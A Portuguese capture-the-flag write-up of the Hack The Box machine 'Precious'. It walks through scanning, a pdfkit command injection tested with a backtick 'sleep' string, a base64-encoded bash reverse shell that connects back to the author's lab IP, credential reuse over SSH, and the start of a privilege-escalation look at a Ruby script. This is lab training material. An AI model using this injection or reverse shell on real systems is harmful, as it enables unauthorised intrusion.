Olá a todos! meu primeiro write-up com uma maquina simples da HTB, esperem que gostem ;)
Sem enrrolação vamos pro CTF!

Maquina: Precious /
OS: Linux

Topicos: 
1- Enumeração 2- identificando Vulnerabilidade 3- Exploração 4-Escalação de Privilegios 5- Pós-exploração
-------------------------------------------------------------------------------------------------
Como de constume, verifico se no IP fornecido á algum indereço de URL para colocarmos em nossa lista /etc/hosts
.Adicionamos: precious.htb

Scan usando: *nmap* P -v -sV -A -Pn -oN scanSimples 10.129.97.151 

-v:  Mostrar os resultados em tempo real.  
-sV: Monstrar versões dos serviços encontrados.
-A:  Mais agressividade, trazendo assim informações extras, como detecção de (SO) detecção de versão, varredura de script e traceroute.
-Pn: desativar a descoberta de host.
-oN: salvar a saída em um arquivo.

![Screenshot_1](https://user-images.githubusercontent.com/120592559/208176107-bd3e31ff-0834-4908-9adc-d57eb625e52a.png)

PORTA 80

![2](https://user-images.githubusercontent.com/120592559/208177876-abf19d48-f284-4cab-8ae5-2a1669ba2856.png)

A ideia do site e simples: colocar o endereço de qualquer outro site, e logo em seguida, ele convertera este site em PDF, alguns segundos depois um arquivo sera baixada em PDF.

![image](https://user-images.githubusercontent.com/120592559/208178439-3a368396-b667-493c-a555-e06b4b16004a.png)

Usando o comando *strings* podemos ver as strings deste documento.

![image](https://user-images.githubusercontent.com/120592559/208179268-a158c907-5a31-4461-88ae-1128d5d8aae4.png)




2- IDENTIFICANDO VULNERABILIDADE
-----------------------------
2- Como na foto anterior nós mostrava que este PDF este sendo processado pelo *pdfkit v0.8.6*. A uma vulnerabilidade de *command injection!*

![image](https://user-images.githubusercontent.com/120592559/208182258-85f43abf-46cd-4cde-8ec3-6a4c8c7f889b.png)

Explicação: Esta vulnerabiliade com o pdfkit v0.8.6 acontece quando a aplicação tentar renderizar uma *URL* que contém parâmetros de string na consulta. Ou seja, se colocarmos a url e logo em seguida a string *'%20`sleep 5`'* usando o comando *sleep 5* . O servidor respondera após 5 segundos.
POC: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

3- EXPLORAÇÃO
-------
Diante do cenario anterior, podemos pensar em nosso *Reverse-Shell*.
1 - Primeiramente costumo abrir o Burp. 
2- Logo em seguida tive ajuda de um site para nós ajudar a montar nosso *Reverse-Shell* https://www.revshells.com/
3 - Abrir uma porta de escuta. Usei o ncat -nlvp 1113

Com o Reverse-Shell montado precisamos codifica-lo em *Base64*: https://www.base64encode.org/
L2Jpbi9iYXNoIC1jICdzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuMjAzLzExMTMgMD4mMSc=

![image](https://user-images.githubusercontent.com/120592559/208185372-cb8b0e5b-b9a7-4dee-9ac5-595422d98bc8.png)

Conexão recebida:

![image](https://user-images.githubusercontent.com/120592559/208185579-274a92c8-20d1-4294-847f-7c14e46cb12c.png)

4-Escalação de Privilegios
------
Procurando por arquivos, permissões, extensões, a uma pasta pasta .blunde com um arquivo de configuração contendo as credenciais do usuario Henry

![image](https://user-images.githubusercontent.com/120592559/208186680-f8b4d393-2da2-4b43-a0ba-dd958f4e1db6.png)

Usamos estás credenciais para entrar via SSH.

![image](https://user-images.githubusercontent.com/120592559/208186986-b9d0607d-993c-4122-8c04-03858866efe4.png)

5- Pós-exploração
---
Começamos vemos as *permissões root* que o usuario Henry tem.
![image](https://user-images.githubusercontent.com/120592559/208187331-7998843b-b23d-4fa6-9021-ce81615232df.png)

Olhando dentro do script:

![image](https://user-images.githubusercontent.com/120592559/208187438-a29da456-2dad-46a3-81dd-db899740be84.png)

Já adianto que entendo pouco coisa de Ruby. Entretanto, resumidamente, e um script que verifica se as versões dos pacotes se a versão for diferente ou igual aqui está no arquivo ele nos retorna um alerta.




